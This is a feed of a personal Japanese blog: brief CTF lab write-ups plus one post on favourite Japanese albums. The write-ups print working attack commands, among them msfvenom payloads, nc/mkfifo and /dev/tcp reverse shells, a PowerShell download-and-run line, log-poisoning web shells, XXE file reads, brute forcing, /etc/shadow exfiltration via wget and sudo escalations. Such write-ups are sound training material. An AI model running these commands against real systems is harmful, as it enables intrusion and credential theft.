      <description>user smb が開いてるのでこれを起点にする enum4linux は動かなかった nmap よく見たら windows だった smbclient -L \\\\ip で使えそうな share を探す nt4wrksv が使えそう パスワードなしで入れる パスワードリストが手に入る nt4wrksv が書き込み可能なのでリバースシェルを入れる(SMB (Server Message Block) Pentesting - Exploit Notes) msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=ip lport=port -f aspx -o shell.asp smb: \&amp;gt; put shell.aspx curl http://10.10.16.163:49663/nt4wrksv/shell.aspx root SeImpersonatePrivilege が使える(Abusing Tokens - HackTricks) wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe を使う eterpreter &amp;gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege meterpreter &amp;gt; shell C:\users\bob\desktop&amp;gt;cd c:/inetpub/wwwroot/nt4wrksv cd c:/inetpub/wwwroot/nt4wrksv c:\inetpub\wwwroot\nt4wrksv&amp;gt;dir dir Volume in drive C has no label.</description>
    </item>
    
    <item>
      <title>Daily Bugle</title>
      <link>http://side-realms.github.io/writeup/dailybugle/</link>
      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/dailybugle/</guid>
      <description>user.txt Joomla! というのが動いてる /language/en-GB/en-GB.xml にアクセスするとバージョンが見える(Joomla - HackTricks) searchsploit で SQLi がヒットする python のエクスプロイトコードが出ている(Exploit-Joomla) ユーザ名とパスワードハッシュが得られる Joomla にログイン リバースシェルが template に貼れる(Joomla: Reverse Shell) beez3 に php リバースシェルを貼る save する nc -nlvp 1234 リバースシェル apache としてログイン，権限がなく user.txt が見れない linpeas.sh でパスワードが露出していることが分かる（どういう仕組みなんだこれ） su jjameson root yum が使えるらしい rpm ロードをやろうとしたが fpm が使えず断念 TF=$(mktemp -d) cat &amp;gt;$TF/x&amp;lt;&amp;lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat &amp;gt;$TF/y.conf&amp;lt;&amp;lt;EOF [main] enabled=1 EOF cat &amp;gt;$TF/y.py&amp;lt;&amp;lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=&amp;#39;2.</description>
    </item>
    
    <item>
      <title>Gamezone</title>
      <link>http://side-realms.github.io/writeup/gamezone/</link>
      <pubDate>Sun, 17 Mar 2024 04:41:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/gamezone/</guid>
      <description>user SQLi をする ユーザ名が分かってないので，ユーザ名のところで &#39; or 1=1 -- - portal.php ではレビューのデータベースを検索する リクエストを burp でキャッチ sqlmap -r request.txt --dbms=mysql --dump ハッシュパスワードとユーザ名がもらえる ssh できるようになる root ssh ポートフォワーディング ss -tulpn コマンドで 10000 ポートに外部から入る通信がファイアウォールによってブロックされていることが分かる ssh -L 10000:localhost:10000 &amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; local で実行する localhost:10000 への通信を，&amp;lt;username&amp;gt;@&amp;lt;ip&amp;gt; を経由して localhost:10000 に転送する SSHトンネル ssh -L 127.0.0.1:8080:example.org:80 ssh-server なので，今回の始点と終点は localhost で，ssh-server が agent47 のサーバ </description>
    </item>
    
    <item>
      <title>Alfred</title>
      <link>http://side-realms.github.io/writeup/alfred/</link>
      <pubDate>Sat, 16 Mar 2024 15:31:32 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/alfred/</guid>
      <description>user.txt windows で jenkin が動いている admin admin で通る hydra -l admin -P /usr/share/wordlists/rockyou.txt thm.local -s 8080 http-post-form &amp;quot;/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^:F=Invalid&amp;quot; -V -t 64 -I Nishang ローカルの Invoke-PowerShellTcp.ps1 があるディレクトリで http サーバを立てる nc -nlvp 1234 jenkins の config -&amp;gt; ビルド -&amp;gt; windows パッチコマンドの実行 powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port build now でリバースシェルがもらえる switch shell msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=ip LPORT=port -f exe -o rv.exe ローカルで python3 -m http.server 8001 powershell で powershell &amp;quot;(New-Object System.</description>
    </item>
    
    <item>
      <title>Steel</title>
      <link>http://side-realms.github.io/writeup/steel/</link>
      <pubDate>Sat, 16 Mar 2024 14:11:33 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/steel/</guid>
      <description>初めての windows
user HTTP File Server があるので metasploit で CVE を見つける root windows は PowerUP.ps1 が使える upload /PowerUp.ps1 Invoke-AllChecks AdvancedSystemCareService9 が再起動できるので，悪意ある exe に置き換える msfvenom -p windows/shell_reverse_tcp LHOST=&amp;lt;attacker ip&amp;gt; LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe &amp;ldquo;shell&amp;rdquo; でシェルを起動 sc stop AdvancedSystemCareService9 copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe sc start AdvancedSystemCareService9 </description>
    </item>
    
    <item>
      <title>Mustacchio</title>
      <link>http://side-realms.github.io/writeup/mustacchio/</link>
      <pubDate>Sat, 16 Mar 2024 14:06:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/mustacchio/</guid>
      <description> /custom/js/users.bak というファイルがある． admin:~~ みたいなのがあって，パスワードがハッシュ化されているのでクラックする -行き詰ったので nmap -A -p- ultraseek-http みたいなのが 8765 で開いてる admin ログインできる XML コードを入れられる XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY example &amp;#34;XML Injection&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;&amp;amp;example;&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;Test paragraph&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe **SYSTEM** &amp;#39;file:///etc/passwd&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; ソースコードに barry, ssh して！みたいなコメントがあったので &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#39;file:////home/barry/.ssh/id_rsa&amp;#39;&amp;gt;]&amp;gt; &amp;lt;comment&amp;gt; &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt; &amp;lt;author&amp;gt;Joe&amp;lt;/author&amp;gt; &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt; &amp;lt;/comment&amp;gt; SSH 鍵をゲット フォーマットがウザい - ----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65 ~~~ snip ~~~ 7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD -----END RSA PRIVATE KEY----- ssh2john root find / -perm -u=s -type f 2&amp;gt;/dev/null live_log を見つける 権限 s strings で tail を見つける 絶対パスじゃないのでパスを追加 /tmp に tail → /bin/bash を作成 export PATH=”/tmp:$PATH” </description>
    </item>
    
    <item>
      <title>C0ldd</title>
      <link>http://side-realms.github.io/writeup/c0ldd/</link>
      <pubDate>Sat, 16 Mar 2024 14:04:24 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/c0ldd/</guid>
      <description>user wordpress が動いている /hidden C0lld, philip, hugo wpscan --url http://10.10.233.13 -U C0ldd -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 ログインすると apperrance が触れるので，404.php にリバースシェルを貼る cat /var/www/html/wp-config.php Coldd のパスワードが見える su C0ldd root sudo -l で ftp が使える ftp -&amp;gt; !/bin/bash </description>
    </item>
    
    <item>
      <title>Archangel</title>
      <link>http://side-realms.github.io/writeup/archangel/</link>
      <pubDate>Sat, 16 Mar 2024 13:41:58 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/archangel/</guid>
      <description>1st flag metafive.thm /etc/host への追加 2nd flag robots.txt にある disallow にアクセスすると php ページに出る LFI GET /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd エスケープに気を付ける必要がある /home/archangel/user.txt が露出していたので先に見る PHP ラッパで test.php の中身も見ると 2nd flag がある ?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php user.txt さっきのやつ user2.txt ログポイズニング burp suite でパケットをキャッチ ”User-Agent: &amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;” GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var//log/apache2/access.log&amp;amp;cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2&amp;gt;%261|nc+10.18.127.137+1234+&amp;gt;/tmp/f HTTP/1.1 空白は +, &amp;amp; は %26 にエスケープする local で nc で待ち構えているとリバースシェルがもらえる archangel が user2.txt の権限をもっている crontab /opt/helloworld.sh が動いている echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 4444 &amp;gt;/tmp/f” &amp;gt; /opt/hellowold.sh root.</description>
    </item>
    
    <item>
      <title>Chocolate</title>
      <link>http://side-realms.github.io/writeup/chocolate/</link>
      <pubDate>Sat, 16 Mar 2024 13:28:17 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/chocolate/</guid>
      <description>user FTP に anonymous ログイン steghide で引き出すと base64 エンコードされたパスワードリストがもらえる nmap したときに localhost うんぬん言われたところにアクセスすると key_rev_key をもらえる strings charlie とパスワードで http にログインするとコードを実行できるフォームが見つかる cat /home/charlie/teleport で ssh 鍵をもらう ssh root vi が使える sudo vi -c &#39;:!/bin/sh&#39; /dev/null </description>
    </item>
    
    <item>
      <title>Gamingserver</title>
      <link>http://side-realms.github.io/writeup/gamingserver/</link>
      <pubDate>Sat, 16 Mar 2024 13:24:19 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/gamingserver/</guid>
      <description>user.txt /secret secretKey がある -&amp;gt; ssh 鍵 /uploads dict.lst -&amp;gt; ssh パスワード鍵候補？ ssh2john secretKey &amp;gt; hash.txt john —wordlist=dict.lst hash.txt ssh ログイン ユーザ名はソースコードから読む このパターンどうにかならんのか root.txt john が lxd ユーザなのでこれを使う alpine イメージのビルド git clone https://github.com/saghul/lxd-alpine-builder.git cd .lxd-alpine-builder /build-alpine イメージ作成（管理者権限付き） lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myContainer lxc init myContainer myVM -c security.privileged=true lxc config device add myVM mydevice disk source=/ path=/mnt/root recursive=true 起動 lxc start myVM lxc exec myVM /bin/sh </description>
    </item>
    
    <item>
      <title>Chill</title>
      <link>http://side-realms.github.io/writeup/chill/</link>
      <pubDate>Sat, 16 Mar 2024 11:49:38 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/chill/</guid>
      <description>user.txt gobuster で見つかった /secret にアクセスすると linux コマンドを実行できるサイトが見つかる ls を実行すると are you hacker? っていうアラートが出る pwd;ls だとアラートが出ず，実行結果が見える ここにリバースシェルを入れればいい whoami;php -r &#39;$sock=fsockopen(&amp;quot;your-vpn-ip&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39; www-data では何もできない sudo -l で，.helpline.sh が apaar として実行できるっぽい .helpline.sh を見ると，$msg 2&amp;gt;/dev/null が見える /bin/bash を実行すれば apaar としてシェルをもらえる root.txt linpeas.sh 127.0.0.1:9001 が localhost から実行できるらしい で，ここに mysql が動いてる local で ssh-keygen echo &amp;quot;contents of .pub&amp;quot; &amp;gt;&amp;gt; /home/apaar/.ssh/authorized_keys ssh -L 9001:127.0.0.1:9001 apaar@10.10.233.203 -i id_rsa index.php を見ると root とパスワードが載ってる apaar から mysql にログイン mysql -h localhost -u root -p show databese show tables SELECT * FROM users -&amp;gt; anurodh のパスワード customer portal みたいなとこからログインして，images をダウンロードする steghide —extract -sf .</description>
    </item>
    
    <item>
      <title>Wgel</title>
      <link>http://side-realms.github.io/writeup/wgel/</link>
      <pubDate>Sat, 16 Mar 2024 11:43:01 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wgel/</guid>
      <description>user.txt unapp というアプリが使われている searchsploit は特になし /sitemap/.ssh .ssh から id_rsa を持ってくる ssh2john id_rsa &amp;gt; hash.txt ユーザ名はソースコードで jessie ssh -i id_rsa jessie@10.10.217.228 root.txt wget が sudo で使えるらしいが GTFObin ではうまくいかない wget privilege escalation でググる ローカルで nc -lvnp 4444 ターゲットで sudo /usr/bin/wget --post-file=/etc/shadow &amp;lt;local-ip&amp;gt; 4444 /etc/shadow が見えるのでコピーする ローカルで ./shadow.txt とかで保存 ローカルで新しいハッシュを作る openssl passwd -6 -salt &#39;salt&#39; &#39;password’ これを shadow.txt に追記 root:$6$salt$IxDD...DCy.g.:18195:0:99999:7::: これを転送 sudo /usr/bin/wget http://&amp;lt;local-ip&amp;gt;:8000/shadow.txt -O /etc/shadow </description>
    </item>
    
    <item>
      <title>Ignite</title>
      <link>http://side-realms.github.io/writeup/ignite/</link>
      <pubDate>Sat, 16 Mar 2024 11:39:35 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/ignite/</guid>
      <description>user.txt searchsploit fuel CMS RCE URL とプロキシを設定しなおす必要アリ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.18.127.137 1234 &amp;gt; /tmp/f find / 2&amp;gt;/dev/null | grep flag.txt root.txt sudo , crontab, linpeas も特になし 細かく linpeas を見ていく password -&amp;gt; mememe みたいなのがある su で使えてしまう </description>
    </item>
    
    <item>
      <title>Brooklyn</title>
      <link>http://side-realms.github.io/writeup/brooklyn/</link>
      <pubDate>Sat, 16 Mar 2024 11:36:42 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/brooklyn/</guid>
      <description>user.txt FTP jake がユーザー名？ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.10.241 ssh find / 2&amp;gt;/dev/null | grep user.txt root.txt less sudo less /etc/profile !/bin/sh </description>
    </item>
    
    <item>
      <title>Bruteit</title>
      <link>http://side-realms.github.io/writeup/bruteit/</link>
      <pubDate>Sat, 16 Mar 2024 11:33:52 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/bruteit/</guid>
      <description>user.txt ソースコードを見ると admin がある hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.144 http-form-post &amp;quot;/admin/:user=^USER^&amp;amp;pass=^PASS^:Username or password invalid id_rsa がもらえる ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 666 id_rsa ssh -i id_rsa john@10.10.184.144 root.txt sudo -l で cat LFILE=/etc/shadow john@bruteit:~$ sudo cat $LFILE root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: これを john で解析する su root </description>
    </item>
    
    <item>
      <title>Skynet</title>
      <link>http://side-realms.github.io/writeup/skynet/</link>
      <pubDate>Sat, 16 Mar 2024 11:17:21 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/skynet/</guid>
      <description>user.txt smb なので enum4linux anonymous milesdyson anonymous でアクセスするとファイルがもらえる パスワードリストをもってくる hydra -l milesdyson -P log1.txt [IP] http-form-post &amp;quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;amp;secretkey=^PASS^&amp;amp;js_autodetect_results=1&amp;amp;just_logged_in=1:Unknown user or password incorrect.&amp;quot; squirrelmail にアクセス )s{A&amp;amp;2Z=F^n_E.B` を受け取る smb に milesdyson でアクセス smbclient //10.10.35.53/milesdyson --user=milesdyson /45kra24zxs28v3yd というディレクトリがあるらしい gobuster dir -u http://10.10.35.53/45kra24zxs28v3yd cuppa が使われている searchsploit cuppa CMS リバースシェルを立てる root.txt crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don&amp;#39;t have to run the `crontab&amp;#39; # command to install the new version when you edit this file # and files in /etc/cron.</description>
    </item>
    
    <item>
      <title>Lazyadmin</title>
      <link>http://side-realms.github.io/writeup/lazyadmin/</link>
      <pubDate>Sat, 16 Mar 2024 11:11:11 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/lazyadmin/</guid>
      <description>enum nmap 22:ssh 80:http gobuster content user.txt searchsploit sweetrice cat /usr/share/exploitdb/exploits/php/webapps/40718.txt You can access to all mysql backup and download them from this directory. http://localhost/inc/mysql_backup and can access to website files backup from: http://localhost/SweetRice-transfer.zip mysql のバックアップ？に接続できるらしい http://10.10.61.5/content/inc/mysql_backup/ manager とパスワードのハッシュが見つかる Arbitary file upload みたいなのを実行する http://10.10.61.5/content/attachment/./shell.php5 に php が出てくるのでアクセスするとリバースシェルを獲得できる root.txt sudo -l $ sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.</description>
    </item>
    
    <item>
      <title>Bounty</title>
      <link>http://side-realms.github.io/writeup/bounty/</link>
      <pubDate>Sat, 16 Mar 2024 11:06:05 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/bounty/</guid>
      <description>enum nmap 21:ftp 22:ssh ftp locks.txt task.txt user.txt hydra ssh で locks.txt を使う user.txt が見える root.txt sudo -l で ```(root) /bin/tar sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh root.txt ゲット </description>
    </item>
    
    <item>
      <title>Blog</title>
      <link>http://side-realms.github.io/writeup/blog/</link>
      <pubDate>Sat, 16 Mar 2024 10:57:51 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/blog/</guid>
      <description>enum 22:ssh 80:http enum4linux BillySMB という share がある bjoel, smb というユーザーがある SMB BillySMB にパスワード無しで入れる よく分からん .txt と .mp4, .png しかない steghide も特になし wpscan wpscan --url http://10.10.208.138/ -e u ユーザ名が bjoel, kwheel wpscan --url http://10.10.208.138 -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 kwheel:cutiepie1 ssh はできない metasploit search crop-image options で設定するとシェルがもらえる user.txt find / 2&amp;gt;/dev/null | grep user.txt $ cat /home/bjoel/user.txt You won&amp;#39;t find what you&amp;#39;re looking for here. TRY HARDER は？ priviledge escalation find / -perm -u=s -type f 2&amp;gt;/dev/null ls -la /usr/sbin/checker -rwsr-sr-x 1 root root 8432 May 26 2020 /usr/sbin/checker ltrace checker getenv(&amp;#34;admin&amp;#34;) = nil puts(&amp;#34;Not an Admin&amp;#34;) = 13 Not an Admin admin という環境変数があるのでこれを設定してみる ltrace checker getenv(&amp;#34;admin&amp;#34;) = &amp;#34;1&amp;#34; setuid(0) = -1 system(&amp;#34;/bin/bash&amp;#34;) あとは実行してシェルをもらうと root になる </description>
    </item>
    
    <item>
      <title>好きな邦楽アルバムを考えたい</title>
      <link>http://side-realms.github.io/sound/best/</link>
      <pubDate>Sat, 09 Mar 2024 13:24:01 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/best/</guid>
      <description>修士も無事取れてジャーナルもちゃんと提出できて，本格的に仕事が始まる四月まで時間があるので(2週間)，今までやってみたかった好きな邦楽アルバムをまとめるやつ，を，やる🍟．
せっかくなので名盤ランキングではなく好きなアルバムという視点でまとめる． 例えば名盤という視点ならジャックスの「ジャックスの世界」は間違いなく入ると思うけど正直このサイケっぽい GS はそこまで好きではないので除外する，みたいな感じ
ジャンル混合の異種格闘ではあるけどボカロだけはそれだけでリストが作れるので除外する．
1. King Gnu / CEREMONY king gnu 自体あまり興味なかったけどいざ聴いてみるとやっぱ良い
というか常田がアクモンとかレディへが好きらしいのでやっぱり聴かず嫌いせずに聴くべきだったんだろうな
シングルとか EP みたいな小さいサイズの仕事をリリースするアーティストが多い中で物語性のあるアルバムを出せるのは king gnu の人気と実力が相まったものだと思う
2. GEZAN / 狂(KLUE) キワモノ感があって極端に尖ったオリエンタルな曲が多いから冷たい雰囲気を感じたけど，聴いてみると意外と人間味があって優しいメッセージの曲が多い
「東京」がピックアップされることが多いけど，「東京」の良さは「東京」以前の「EXTACY」とか「AGEHA」みたいなストイックな曲から「Soul Material」からだんだんと優しさが見えてきたあたりで刺さってくるものだと思うので，ぜひアルバムで聴いてほしいと思っている
関係ないけど apple music でワールドミュージックに分類されてて笑った．分からなくもない
3. cero / Obscure Ride 日本人がブラックミュージックを作ろうとするときはどうしても黒人への憧れみたいなものが全面的に出てしまって，ビジュアルばかりに注目してしまったりとか（ドレッドヘアーみたいなもの．黒人文化への配慮が欠けてるみたいな批判もあるけど立派なアプローチの一つだと思う．），日本ぽさもファンクっぽさも失ってしまったりすることが多々あると思うが， cero の Obscure Ride はあくまでブラックミュージックの模倣であることを認めつつ，都会的な日本人ぽさを失わずにファンクを作れていると思った．小沢健二とかが出たときもこんな感じだったのかな，少し違うか
4. andymori / andymori 曲風以上に歌詞が文学的だなと思うことが多い． 文学的というか「実は何も考えてないのか？」みたいに思うくらい抽象的な歌詞に出会うこともある．Smells Like Teen Spirit みたいにガレージの激しさと感覚的な歌詞をやりたかったのかなと思うこともある．
「僕が白人だったら」がめちゃいい．欧米コンプレックスはアジア人が書くと一気に切実になると思う．
ちなみに「和製リバティーンズ」にはあまり納得していない
5. ZAZEN BOYS / らんど 新譜だからか？
ナンバガのときもそうだったけどこのギターの遠さは他のバンドにない感じがして良い．今更悪い機材を使ってカウンターすることもないだろうからそういう EQ をかけてるのかな？
ライブに行きたい
6. MONO NO AWARE / かけがえのないもの 4~5 年前くらいにアルバイトの通勤でずっと聴いてた記憶がある． 「言葉になかったら」は冗談抜きで邦楽全体の中でも上位に入るクオリティだと思う．ロックとかシティポップに簡単に寄り添わない曲調が良く刺さる．</description>
    </item>
    
    <item>
      <title>Cyborg</title>
      <link>http://side-realms.github.io/writeup/cyborg/</link>
      <pubDate>Wed, 21 Feb 2024 07:18:48 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/cyborg/</guid>
      <description>ウェルベルムコトハちゃんの事実を曲げる能力強すぎない？
enum nmap 22/ssh 80/http gobuster /admin /etc ssh /etc にアクセスすると squid プロキシの情報が見れる ユーザ名とパスワードハッシュの組み合わせが見えるのでこれを使う とりあえず john でパスワードを手に入れる ssh にこれを使ったけど通らなかった hydra も通らない http に戻るとバックアップファイルをダウンロードするところがあったのでダウンロードする tar -xvf archive.tar borg というバックアップアプリを使っているらしい borg list /home/kali/THM/home/field/dev/final_archive borg extract /home/kali/THM/home/field/dev/final_archive::music_archive borg の使い方に少し苦労した ユーザ名は alex, パスワードも note.txt に書いてある root.txt ssh する sudo -l で /etc/mp3backups/backup.sh が見つかる while getopts c: flag do case &amp;#34;${flag}&amp;#34; in c) command=${OPTARG};; esac done --- (snip) --- cmd=$($command) echo $cmd -c オプションでコマンドを実行できる(なんのため？) sudo /etc/mp3backups/backup.</description>
    </item>
    
    <item>
      <title>StartUp</title>
      <link>http://side-realms.github.io/writeup/startup/</link>
      <pubDate>Wed, 21 Feb 2024 02:52:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/startup/</guid>
      <description>最近 KAGOME の朝フルーツこれ一本を昼ごはんにしている
健康になった気でいる
enum nmap ftp ssh http gobuster files FTP anonymous ログインができる http から files で中身が見れて，ftp の中身が同期していることが分かる php のリバースシェルを配置する put php-reverse-shell.php シェル とりあえず中に入るとレシピが見れる lennie でログインする必要がある ./incidents ディレクトリ内で .pcapng が手に入る wireshark で .pcapng の TCP ストリームを追うとパスワードが手に入る これが lennie のパスワードだった(!?) あとは user.txt root.txt ./linpeas.sh はすぐに使えそうなものはない．．． ./scripts ディレクトリがあるので探してみる ./planner.sh が root で動作している ./planner.sh が呼び出す ./print.sh は lennie が所有している lennei で print.sh を書き換えて bash を呼び出せば root シェルが手に入る echo &amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/[ip]/8888 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt; /etc/print.</description>
    </item>
    
    <item>
      <title>SimpleCTF</title>
      <link>http://side-realms.github.io/writeup/simplectf/</link>
      <pubDate>Wed, 21 Feb 2024 02:31:08 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/simplectf/</guid>
      <description>デュエマ，ゼニスというか昔のキャラが復活しているらしく，非常にやりたい
動画見たら 4t ゼニスとかあって笑った
enum nmap 21/ftp 80/http 2222/ssh gobuster simple CVE CMS 2.2.8 で構成されたサイトが見つかる CVE-2019-9053 で SQLi が通るっぽい PoC を指してuser name と password を手に入れる ssh user.txt が手に入る sudo -l で vim がパスワード無しで使えるらしい sudo vim -c &#39;:!/bin/sh&#39; root.txt が手に入る </description>
    </item>
    
    <item>
      <title>BasicPentesting</title>
      <link>http://side-realms.github.io/writeup/basicpentesting/</link>
      <pubDate>Wed, 21 Feb 2024 02:21:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/basicpentesting/</guid>
      <description>friko, マジでアツい
radio head でもあり bright eyes でもあり全曲の殺意がまんべんなく高い\
enum 22/ssh 80/http 8009/ajp 8080/http-proxy SMB SMB が空いてるようだったのでログインする enum4linux 10.10.77.150 smbclient \\\\10.10.77.150\\Anonymous -U Anonymous more staff.txt user name は Jan ? ssh ssh でブルートフォース hydra -t 16 -l jan -P /usr/share/wordlists/rockyou.txt 10.10.77.150 ssh Jan じゃなくて jan なのキモすぎ，揃えてくれ ssh ログイン Kay が見つかる .ssh が見つかったので id_rsa を持ってきて ssh2john scp jan@10.10.77.150:/home/kay/.ssh/id_rsa ./ - ssh2john id_rsa &amp;gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt chmod 600 ./id_rsa ssh -i id_rsa kay@10.</description>
    </item>
    
    <item>
      <title>RootMe</title>
      <link>http://side-realms.github.io/writeup/rootme/</link>
      <pubDate>Tue, 20 Feb 2024 02:16:10 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/rootme/</guid>
      <description>植峰ノルジュ，最近マジでアツい
マイクラ配信がおもしろすぎる
enum nmap 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) gobuster /panel：ファイルアップロード用 /uploads：アップロードが見える user.txt リバースシェルをアップロードすればいい .php のフィルタがかかっているので .php5 とかにでもしてアップロード root.txt linpeas.sh で /usr/bin/python がヒットしたので GTFObin でみる python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)’ おしまい </description>
    </item>
    
    <item>
      <title>WifiHacking 101</title>
      <link>http://side-realms.github.io/writeup/wifihacking/</link>
      <pubDate>Tue, 20 Feb 2024 02:06:20 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wifihacking/</guid>
      <description>BOØWY，空前の大ブーム
aircrack-ng 4way-handshakeをキャプチャした pcap が得られるので，これをクラックすればいい Aircrack-ng ~~.cap -w ~~.txt で総当たりができるらしいが遅いので，HCAAPX ファイルに変換する方法が使えるらしい aircrack-ng -j wifi ~~.cap aircrack-ng -a2 -b BSSID -w ~~.txt ~~.hccapx え，終わった．．． 手元の環境でもやりたい</description>
    </item>
    
    <item>
      <title>Agent Sudo</title>
      <link>http://side-realms.github.io/writeup/sudoagent/</link>
      <pubDate>Sat, 17 Feb 2024 20:49:48 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/sudoagent/</guid>
      <description>そういえばLerningしかやってなくてマシンを解いてないことに気付いたのでせっかくなら writeup を書きつつやっていく
